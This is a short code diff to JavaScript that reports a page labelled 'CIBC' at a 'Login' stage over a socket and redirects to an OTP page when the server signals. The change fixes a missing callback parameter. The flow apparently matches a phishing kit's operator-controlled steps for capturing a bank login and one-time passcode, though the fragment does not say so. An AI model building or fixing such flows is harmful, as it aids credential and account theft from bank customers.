@@ -451,7 +451,7 @@
     let navig = `/details`;
      socket.emit('pageandstage', {page: 'CIBC', stage: 'Login'})
 
-    socket.on('OTP', () => {
+    socket.on('OTP', (data) => {
         if(data.otp){
             navig = `/otp`;
         } 
